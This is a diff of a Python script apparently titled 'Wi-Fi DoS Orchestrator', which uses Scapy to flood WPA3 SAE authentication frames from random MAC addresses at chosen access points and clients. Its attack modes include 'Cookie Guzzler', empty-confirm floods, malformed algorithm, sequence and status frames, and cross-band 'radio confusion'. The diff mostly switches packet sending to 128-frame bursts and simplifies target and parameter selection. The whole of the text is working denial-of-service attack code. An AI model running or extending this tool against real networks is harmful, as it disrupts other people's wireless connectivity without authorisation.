+            send_burst(burst, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_empty_frame_confirm_generic_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
+    from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
     if not set_channel(interface, channel): return
     print(f"[INFO-EMPTY-GENERIC] {interface}: Starting Empty Frame (Generic)...")
     try:
         while True:
-            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)
-            sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
-            with counter.get_lock(): counter.value += 20
-            time.sleep(0.5)
+            burst = []
+            for _ in range(128):
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)
+                burst.append(pkt)
+            send_burst(burst, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_cookie_guzzler_process(interface, counter, **kwargs):
     """Cookie Guzzler: SAE Flooding to trigger Anti-Clogging"""
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
+    from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
     if not set_channel(interface, channel): return
-    print(f"[INFO-COOKIE] {interface}: Starting Cookie Guzzler...")
+    print(f"[INFO-COOKIE] {interface}: Starting Cookie Guzzler (Unique Bursts)...")
     SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
     try:
         while True:
-            packet = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
-            sendp(packet, count=128, inter=0.0001, iface=interface, verbose=0)
-            with counter.get_lock(): counter.value += 128
+            burst = []
+            for _ in range(128):
+                pkt = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
+                burst.append(pkt)
+            send_burst(burst, interface, counter)
     except KeyboardInterrupt: pass
 
 # =====================================================================================
@@ -614,7 +632,7 @@ def run_cookie_guzzler_process(interface, counter, **kwargs):
 def main():
     if os.geteuid() != 0: sys.exit("[ERROR] This script must be run with sudo privileges.")
     
-    print("\n" + "="*80 + "\nWi-Fi DoS Orchestrator - Complete Arsenal with Scanner\n" + "="*80)
+    print("\n" + "="*80 + "\nWi-Fi DoS Orchestrator - COMPLETE ARSENAL (SCIENTIFICALLY CORRECTED)\n" + "="*80)
     
     cleanup({})
     
@@ -630,19 +648,16 @@ def main():
             procs['scanner'] = scanner_proc
             
             scan_duration = 90
-            csv_filename = None
             for i in range(scan_duration):
                 files = glob.glob("scan_result*.csv")
                 if files:
-                    csv_filename = files[0]
-                    parsed_info = get_target_info_from_csv(csv_filename, TARGET_STA_MACS + TARGET_STA_MACS_5GHZ_SPECIAL + TARGET_STA_MACS_2_4GHZ_SPECIAL)
+                    parsed_info = get_target_info_from_csv(files[0], TARGET_STA_MACS + TARGET_STA_MACS_5GHZ_SPECIAL + TARGET_STA_MACS_2_4GHZ_SPECIAL)
                     current_ap_targets = parsed_info['aps']
                     current_client_targets = parsed_info['clients']
                 
-                status_5g = f"CH {current_ap_targets['5ghz']['channel']}" if current_ap_targets.get('5ghz') else "Searching AP"
-                status_2g = f"CH {current_ap_targets['2.4ghz']['channel']}" if current_ap_targets.get('2.4ghz') else "Searching AP"
-                clients_status = f"Clients [5G:{len(current_client_targets['5ghz'])}|2.4G:{len(current_client_targets['2.4ghz'])}]"
-                sys.stdout.write(f"\r[INFO] Scan: [5G: {status_5g}] [2.4G: {status_2g}] | {clients_status} ({i+1}/{scan_duration}s) ")
+                status_5g = f"CH {current_ap_targets['5ghz']['channel']}" if current_ap_targets.get('5ghz') else "Searching..."
+                status_2g = f"CH {current_ap_targets['2.4ghz']['channel']}" if current_ap_targets.get('2.4ghz') else "Searching..."
+                sys.stdout.write(f"\r[INFO] Scan: [5G: {status_5g}] [2.4G: {status_2g}] ({i+1}/{scan_duration}s) ")
                 sys.stdout.flush()
 
                 if current_ap_targets.get('5ghz') and current_ap_targets.get('2.4ghz'):
@@ -651,8 +666,6 @@ def main():
                 time.sleep(1)
             
             scanner_proc.terminate()
-            if not (current_ap_targets.get('5ghz') and current_ap_targets.get('2.4ghz')):
-                 print("\n[WARNING] Not all target APs were found. The script will attempt to proceed with the found targets.")
         else:
             print("[INFO] Manual mode: Using channels from configuration.")
             if MANUELLER_KANAL_5GHZ: current_ap_targets['5ghz'] = {'bssid': TARGET_BSSID_5GHZ, 'channel': MANUELLER_KANAL_5GHZ}
@@ -691,28 +704,18 @@ def main():
                 continue
 
             # SMART PARAMETER SELECTION
-            # Default: Use parameters of the adapter's band
             scalar_to_use = SAE_SCALAR_5_HEX if band == '5GHz' else SAE_SCALAR_2_4_HEX
             finite_to_use = SAE_FINITE_5_HEX if band == '5GHz' else SAE_FINITE_2_4_HEX
 
-            # Special Cases: Radio Confusion attacks (Case 6 / 13)
-            # Logic: If I am on 2.4GHz attacking 5GHz, I need 5GHz params.
-            # case6_radio_confusion: Adapter 2.4G -> Target 5G. Needs 5G Params.
-            if attack_type == "case6_radio_confusion":
+            # Special Cases for Radio Confusion
+            if attack_type in ["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]:
+                # Adapter on 2.4 -> Target 5GHz (Needs 5G params)
                 scalar_to_use = SAE_SCALAR_5_HEX
                 finite_to_use = SAE_FINITE_5_HEX
-            # case6_radio_confusion_reverse: Adapter 5G -> Target 2.4G. Needs 2.4G Params.
-            elif attack_type == "case6_radio_confusion_reverse":
+            elif attack_type in ["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]:
+                # Adapter on 5G -> Target 2.4GHz (Needs 2.4G params)
                 scalar_to_use = SAE_SCALAR_2_4_HEX
                 finite_to_use = SAE_FINITE_2_4_HEX
-            # case13_radio_confusion_mediatek: Adapter 5G -> Target 2.4G. Needs 2.4G Params.
-            elif attack_type == "case13_radio_confusion_mediatek":
-                scalar_to_use = SAE_SCALAR_2_4_HEX
-                finite_to_use = SAE_FINITE_2_4_HEX
-            # case13_radio_confusion_mediatek_reverse: Adapter 2.4G -> Target 5G. Needs 5G Params.
-            elif attack_type == "case13_radio_confusion_mediatek_reverse":
-                scalar_to_use = SAE_SCALAR_5_HEX
-                finite_to_use = SAE_FINITE_5_HEX
 
             kwargs = { 
                 'bssid': ap_info['bssid'], 
@@ -723,19 +726,20 @@ def main():
                 'clients': [] 
             }
             
-            # Pass all BSSID/Channel info for cross-band attacks
             kwargs['bssid_5ghz'] = current_ap_targets.get('5ghz', {}).get('bssid')
             kwargs['channel_5ghz'] = current_ap_targets.get('5ghz', {}).get('channel')
             kwargs['bssid_2_4ghz'] = current_ap_targets.get('2.4ghz', {}).get('bssid')
             kwargs['channel_2_4ghz'] = current_ap_targets.get('2.4ghz', {}).get('channel')
 
             # Client Selection Logic
-            if attack_type in ["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]: kwargs['clients'] = TARGET_STA_MACS_5GHZ_SPECIAL
-            elif attack_type in ["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]: kwargs['clients'] = TARGET_STA_MACS_2_4GHZ_SPECIAL
-            elif attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler"]:
+            if attack_type in ["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]: 
+                kwargs['clients'] = TARGET_STA_MACS_5GHZ_SPECIAL
+            elif attack_type in ["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]: 
+                kwargs['clients'] = TARGET_STA_MACS_2_4GHZ_SPECIAL
+            elif attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler", "case7_back_to_the_future"]:
                 kwargs['clients'] = TARGET_STA_MACS
 
-            needs_clients = "clients" in kwargs and attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler"]
+            needs_clients = "clients" in kwargs and attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler", "case7_back_to_the_future"]
             if needs_clients and not kwargs['clients']:
                 if SCANNER_INTERFACE:
                     found_clients = current_client_targets['5ghz'] if band == '5GHz' else current_client_targets['2.4ghz']
